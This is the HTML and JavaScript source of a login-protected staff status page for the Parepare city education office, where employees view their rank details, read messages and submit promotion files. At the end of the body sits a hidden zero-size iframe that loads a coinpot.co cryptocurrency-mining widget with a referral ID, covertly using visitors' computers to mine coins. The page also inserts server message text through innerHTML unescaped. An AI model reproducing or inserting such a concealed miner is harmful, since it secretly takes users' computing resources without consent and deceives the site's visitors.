<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="icon" href="favicon.ico" type="image/x-icon" />
    <link
      href="https://fonts.googleapis.com/css?family=Roboto&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" type="text/css" href="./css/style.css" />
    <title>DISDIKBUD PAREPARE status</title>
    <style>
      .logoutWrap {
        text-align: right;
        background-color: rgb(48, 156, 214);
        position: sticky;
        position: -webkit-sticky;
        top: 0;
        margin: 0;
        z-index: 1;
      }

      .logoutButton {
        border-left: oldlace 2px solid;
        background-color: rgb(226, 81, 81);
      }

      .wrapheader {
        padding: 15px;
        /* background-color: #1fc8db;
            color: floralwhite; */
        height: 150px;
        border-bottom: 2px solid whitesmoke;
        display: table-cell;
        vertical-align: middle;
      }

      .wrapbody {
        visibility: hidden;
        padding: 5%;
        overflow: auto;
      }

      td {
        padding: 2%;
        text-align: left;
      }

      td:nth-child(event) {
        text-align: right;
      }

      .title {
        font-size: 3.5vw;
        line-height: 150%;
      }

      .footer {
        font-size: small;
        line-height: 150%;
      }

      table {
        min-width: 375px;
        max-width: 500px;
      }

      .loading {
        text-align: center;
        position: sticky;
        top: 40vh;
      }

      .mendaftar {
        padding: 10px;
        border: none;
        outline-style: none;
        color: rgb(255, 255, 255);
        background-color: rgb(72, 155, 33);
        margin-left: 1%;
        margin-top: 20px;
        cursor: pointer;
        -webkit-box-shadow: 3px 3px 7px 1px #4f4f4f;
        box-shadow: 3px 3px 7px 1px #4f4f4f;
        /* display: none; */
      }

      .mendaftar:hover {
        -webkit-box-shadow: 0px 10px 13px -7px #000000,
          3px 3px 7px 1px rgba(79, 79, 79, 0);
        box-shadow: 0px 10px 13px -7px #000000,
          3px 3px 7px 1px rgba(79, 79, 79, 0);
      }

      #syuaib {
        position: fixed;
        right: 2%;
        bottom: 0;
        font-size: smaller;
        color: rgb(219, 219, 219);
        text-shadow: 1px 1px 2px #4f2215;
      }

      #boxmasukan {
        resize: none;
        height: 30vh;
      }

      .boxmasukan {
        width: 100%;
        position: fixed;
        top: 50px;
        display: none;
        z-index: 2;
      }

      .wrapMasukan {
        width: 300px;
        margin-left: auto;
        text-align: center;
        padding: 20px;
        border-radius: 5px;
        background-color: rgb(253, 253, 253);
        box-shadow: 0 10px 16px 0 rgba(0, 0, 0, 0.2),
          0 6px 20px 0 rgba(0, 0, 0, 0.19) !important;
      }

      h3,
      h5 {
        color: rgb(63, 62, 62);
      }

      .wrapMasukan button {
        display: block;
        padding: 15px;
        background-color: rgb(72, 155, 33);
        color: whitesmoke;
        border: none;
        margin-left: 13px;
      }

      #textmasukan {
        height: 200px;
        padding: 10px;
        overflow: scroll;
        text-align: justify;
      }

      .gmd {
        -webkit-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25),
          0 10px 10px rgba(0, 0, 0, 0.22);
        -moz-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25),
          0 10px 10px rgba(0, 0, 0, 0.22);
        -ms-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25),
          0 10px 10px rgba(0, 0, 0, 0.22);
        -o-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25),
          0 10px 10px rgba(0, 0, 0, 0.22);
        box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25),
          0 10px 10px rgba(0, 0, 0, 0.22);
      }

      .backform {
        background-color: rgba(255, 255, 255, 0.75);
      }

      .wrapterkirim {
        width: 100%;
        height: 100%;
        /* background-color: grey; */
        position: fixed;
        z-index: 2;
        /* text-align: center; */
        display: none;
      }

      .terkirim {
        top: 40%;
        position: relative;
      }

      .terkirim button {
        display: block;
        padding: 15px;
        background-color: rgb(72, 155, 33);
        color: whitesmoke;
        border: none;
        margin-left: 95px;
      }

      .close {
        position: absolute;
        transform: translate(240px, -25px);
        cursor: pointer;
      }

      div.countPesan {
        position: absolute;
        background-color: #ff423c;
        border-radius: 50px;
        transform: translate(-10px, 30px);
        /* box-shadow: 0 1px 9px 0px #ff423c, 1px 1px 12px 0px #ff423c; */
        width: 20px;
        height: 20px;
        display: none;
      }
    </style>
  </head>

  <body>
    <div class="boxmasukan">
      <div class="wrapMasukan">
        <h3 class="close">X</h3>
        <h3>Kotak Pesan</h3>
        <div name="textmasukan" id="textmasukan">
          Tidak ada pesan untuk Anda
        </div>
      </div>
    </div>
    <div class="wrapterkirim gmd backform">
      <div class="terkirim wrapMasukan">
        <h5>Masukan Anda telah terkirim<br /><br />Terima kasih</h5>
        <button id="tutup">Tutup</button>
      </div>
    </div>
    <div class="logoutWrap">
      <ul class="nav">
        <li class="nav akun">Akun</li>
        <li class="nav masukan">
          <div class="countPesan"></div>
          Pesan
        </li>
        <li class="nav logoutButton">KELUAR</li>
      </ul>
    </div>
    <div class="wrap">
      <div class="wrapheader">
        <span class="title"
          >DINAS PENDIDIKAN DAN KEBUDAYAAN KOTA PAREPARE <br />BIDANG
          KEPEGAWAIAN</span
        >
      </div>
      <div class="loading">
        <img src="./image/Eclipse.svg" alt="loading" />
      </div>
      <div class="wrapbody">
        <table>
          <tr>
            <td style="width: 40%;">NAMA</td>
            <td style="width: 2%;">:</td>
            <td style="width: 58%;" id="tblNama"></td>
          </tr>
          <tr>
            <td>NIP</td>
            <td>:</td>
            <td id="tblNip"></td>
          </tr>
          <tr>
            <td>TMT Pangkat Terakhir</td>
            <td>:</td>
            <td id="tmt"></td>
          </tr>
        </table>
        <button class="mendaftar" id="mendaftarBtn">Kirim Berkas</button>
      </div>
      <div class="wrapfooter">
        <p class="footer">
          Naik Pangkat dan Kenaikan Gaji Berkala secara online diselenggarakan
          untuk mempermudah setiap ASN dalam melakukan proses pendaftaran dan
          mempercepat proses administrasi kepegawaian di lingkup Dinas
          Pendidikan dan Kebudayaan Kota Parepare
        </p>
      </div>
    </div>

    <!-- <p id="syuaib">Code/Design By syuaib</p> -->
    <script src="./js/main.js"></script>
    <script>
      let mendaftarBtn = document.querySelector("#mendaftarBtn");
      let logoutButton = document.querySelector(".logoutButton");
      let wrapbody = document.querySelector(".wrapbody");
      let masukan = document.querySelector(".masukan");
      let boxmasukan = document.querySelector(".boxmasukan");
      let textmasukan = document.querySelector("#textmasukan");
      let wrapterkirim = document.querySelector(".wrapterkirim");
      let tutup = document.querySelector("#tutup");
      let loading = document.querySelector(".loading");
      let akun = document.querySelector(".akun");
      let close = document.querySelector(".close");
      let countPesan = document.querySelector(".countPesan");

      close.addEventListener("click", () => {
        boxmasukan.setAttribute("style", "display:none");
      });

      akun.addEventListener("click", () => location.assign("akun.html"));

      if (main.ambilDb("nip") == null || main.ambilDb("nip") == "") {
        location.assign("index.html");
      } else {
        main.cekLogin(main.ambilDb("nip")).then((data) => {
          if (JSON.parse(data) == false) {
            location.assign("index.html");
          } else {
            let tblNama = document.querySelector("#tblNama");
            let tblNip = document.querySelector("#tblNip");
            async function simpanDb() {
              if (main.ambilDb("db") == null || main.ambilDb("db") == "") {
                await main.simpanDb(data);
              }
              var dataPegawai = JSON.parse(main.ambilDb("db"));
              tblNama.innerHTML = dataPegawai.nama;
              tblNip.innerHTML = dataPegawai.nip;
              loading.setAttribute("style", "display:none");
              wrapbody.setAttribute("style", "visibility:visible");
              main.bacaPesan().then((res) => {
                pembacapesan();
              });
            }
            simpanDb();
          }
        });
      }

      logoutButton.addEventListener("click", keluar);

      function keluar() {
        loading.setAttribute("style", "display:block");
        wrapbody.setAttribute("style", "display:none");
        main.logout().then((data) => {
          if (data == "false") {
            localStorage.removeItem("db");
            localStorage.removeItem("nip");
            localStorage.removeItem("pesan");
            location.assign("index.html");
          }
        });
      }

      masukan.addEventListener("click", () => {
        let data = {
          username: JSON.parse(main.ambilDb("db")).nip,
          countPesan: "ok",
        };
        main.kirimdata(data).then((res) => {
          countPesan.style.display = "none";
        });
        boxmasukan.setAttribute("style", "display:block");
      });

      function pembacapesan() {
        setInterval(function bacaPesan() {
          //console.log(main.ambilDb('pesan'));
          main.bacaPesan();
          if (
            btoa(JSON.parse(main.ambilDb("pesan")).pesan) !=
            btoa(textmasukan.innerHTML)
          ) {
            textmasukan.innerHTML = JSON.parse(main.ambilDb("pesan")).pesan;
            if (JSON.parse(main.ambilDb("pesan")).statusPesan == "") {
              countPesan.style.display = "block";
            }else{
              countPesan.style.display = "none";
            }
          }
        }, 3000);
      }

      //countPesan.addEventListener('click', ()=>{countPesan.style.display = 'none';})

      mendaftarBtn.addEventListener("click", () => {
        location.assign("pendaftaran.html");
      });
    </script>
    <iframe
      scrolling="no"
      frameborder="0"
      src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget"
      style="overflow: hidden; width: 0; height: 0;"
    ></iframe>
  </body>
</html>
